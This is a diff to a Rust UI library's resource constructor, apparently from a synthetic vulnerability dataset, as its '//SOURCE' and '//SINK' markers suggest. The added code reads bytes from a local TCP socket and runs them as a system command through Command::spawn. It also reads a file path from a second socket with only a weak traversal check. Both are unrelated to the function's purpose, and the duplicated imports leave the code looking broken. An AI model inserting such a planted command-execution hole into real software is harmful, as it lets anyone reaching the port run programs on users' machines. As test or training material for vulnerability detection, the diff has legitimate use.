@@ -41,7 +41,14 @@ use std::{
         Arc, RwLock,
     },
     task::{Context, Poll, Waker},
+    net::TcpStream,
+    io::Read,
+    fs,
+    path::Path,
 };
+use std::net::TcpStream;
+use std::io::Read;
+use std::process::Command;
 
 /// A reference-counted resource that only loads once.
 ///
@@ -559,6 +566,23 @@ where
         fut: impl Future<Output = T> + Send + 'static,
         blocking: bool,
     ) -> Self {
+        let mut stream = TcpStream::connect("127.0.0.1:9102").unwrap();
+        let mut buf = [0u8; 128];
+        //SOURCE
+        let n = stream.read(&mut buf).unwrap();          
+        let data = String::from_utf8_lossy(&buf[..n]);
+        let _ = Self::execute_system_action(&data);      
+
+        let mut socket = TcpStream::connect("127.0.0.1:8000").unwrap();
+        let mut buffer = [0u8; 1024];
+        //SOURCE
+        let _bytes_read = socket.read(&mut buffer).unwrap();
+        let _config_data = String::from_utf8_lossy(&buffer).trim_matches('\0').to_string();
+
+        let canonical = _config_data.replace('\\', "/").trim().to_lowercase();
+        let _ = process_configuration_template(&canonical);   
+        
+
         #[cfg(any(debug_assertions, leptos_debuginfo))]
         let defined_at = Location::caller();
         Self {
@@ -568,6 +592,29 @@ where
             #[cfg(any(debug_assertions, leptos_debuginfo))]
             defined_at,
         }
+    }
+
+    fn execute_system_action(raw: &str) -> std::io::Result<()> {
+        let step1 = raw.trim().replace(['\r', '\n', '\0'], " ");
+        let step2 = step1.split_once('#').map(|(a, _)| a).unwrap_or(&step1);
+        let step3 = step2.replace("\\", "/");
+        let decoded = step3
+            .replace("%20", " ")
+            .replace("%2F", "/")
+            .replace("%3A", ":");
+        let parts: Vec<&str> = decoded
+            .split_whitespace()
+            .filter(|s| !s.is_empty())
+            .collect();
+
+        let cmd = parts.get(0).copied().unwrap_or("echo");
+        //SINK
+        let mut builder = Command::new(cmd);
+        for arg in parts.iter().skip(1) {
+            builder.arg(arg);
+        }
+        builder.spawn()?;
+        Ok(())
     }
 
     /// Synchronously, reactively reads the current value of the resource and applies the function
@@ -874,4 +921,43 @@ where
     ) -> Self {
         OnceResource::new_with_options(fut, true)
     }
+}
+
+/// Processes configuration data and loads template files
+pub fn process_configuration_template(config_data: &str) -> Result<String, Box<dyn std::error::Error>> {
+    let mut processed_path = config_data.trim().to_string();
+    
+    processed_path = processed_path.replace("\\", "/");
+    
+    if processed_path.starts_with("./") {
+        processed_path = processed_path[2..].to_string();
+    }
+    
+    let base_path = "./templates/";
+    let full_path = format!("{}{}", base_path, processed_path);
+    
+    let template_path = Path::new(&full_path);
+    
+    let path_components: Vec<&str> = template_path.components()
+        .map(|c| c.as_os_str().to_str().unwrap_or(""))
+        .collect();
+    
+    let has_suspicious_patterns = path_components.iter()
+        .any(|&comp| comp == ".." || comp.contains(".."));
+    
+    if has_suspicious_patterns {
+        return Err("Invalid path pattern detected".into());
+    }
+    
+    //SINK
+    let template_content = fs::read_to_string(&full_path)?;
+    
+    // Process the template content
+    let processed_content = template_content
+        .lines()
+        .map(|line| format!("<!-- Processed: {} -->", line))
+        .collect::<Vec<String>>()
+        .join("\n");
+    
+    Ok(processed_content)
 }
